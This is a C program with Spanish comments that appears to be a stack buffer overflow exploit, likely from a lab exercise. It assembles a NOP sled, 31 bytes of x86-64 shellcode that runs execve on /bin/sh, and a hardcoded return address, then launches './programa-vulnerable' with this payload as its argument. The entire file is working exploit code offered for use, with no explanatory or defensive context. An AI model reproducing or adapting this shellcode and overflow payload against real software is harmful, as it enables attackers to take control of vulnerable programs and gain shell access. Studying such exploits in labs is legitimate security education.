#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {

    size_t payload_size = 16 + 31 + 25 + 6;  // 31 bytes de shellcode
    char *payload = (char *)malloc(payload_size + 1);  // +1 para el NULL del final


    memset(payload, 0x90, 16);  // NOP del principio

    // Shellcode
    memcpy(payload + 16,
        "\x48\x31\xc0\xb0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x2f\x62\x69"
        "\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05",
        31);

    memset(payload + 16 + 31, 0x90, 25);  // NOP del final

    // Direcci√≥n de retorno
    memcpy(payload + 16 + 31 + 25, "\xe0\xe2\xff\xff\xff\x7f", 6);

    payload[payload_size] = '\0';

    // Ejecutar
    char *args[] = {"./programa-vulnerable", payload, NULL};
    execv(args[0], args);

    free(payload);
    return 0;
}